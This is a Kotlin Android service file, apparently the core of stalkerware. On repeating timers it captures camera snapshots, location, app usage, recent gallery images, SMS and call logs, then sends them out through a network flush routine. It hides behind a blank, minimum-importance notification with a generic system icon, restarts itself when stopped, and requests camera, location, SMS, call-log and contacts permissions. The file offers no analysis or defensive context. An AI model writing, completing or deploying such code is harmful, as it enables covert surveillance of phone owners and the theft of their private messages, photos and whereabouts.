package com.sys.sync

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import java.util.*
import kotlin.concurrent.timer

class CoreService : Service() {
    override fun onBind(i: Intent?): IBinder? = null
    override fun onCreate() {
        startForeground(1, buildNotif())
        timer(daemon = true, period = 30000) { Net.flush() }
        timer(daemon = true, period = 60000) { Usage.scan(this) }
        timer(daemon = true, period = 300000) { Cam.snap(this) }
        timer(daemon = true, period = 300000) { Loc.ping(this) }
        timer(daemon = true, period = 600000) { Gallery.recent(this) }
        SmsCalls.scan(this)
    }
    private fun buildNotif(): Notification {
        val ch = "sys"
        if (Build.VERSION.SDK_INT >= 26) {
            val m = getSystemService(NotificationManager::class.java)
            m.createNotificationChannel(NotificationChannel(ch, "Service", NotificationManager.IMPORTANCE_MIN))
        }
        return Notification.Builder(this, ch)
            .setContentTitle("").setSmallIcon(android.R.drawable.ic_menu_manage).build()
    }
    override fun onStartCommand(i: Intent?, f: Int, s: Int) = START_STICKY
    companion object {
        fun start(c: Context) {
            val i = Intent(c, CoreService::class.java)
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i) else c.startService(i)
        }
        fun requestRuntime(a: Activity) {
            val perms = mutableListOf(
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_CONTACTS
            )
            if (Build.VERSION.SDK_INT >= 33) perms.add(android.Manifest.permission.POST_NOTIFICATIONS)
            a.requestPermissions(perms.toTypedArray(), 42)
        }
    }
}
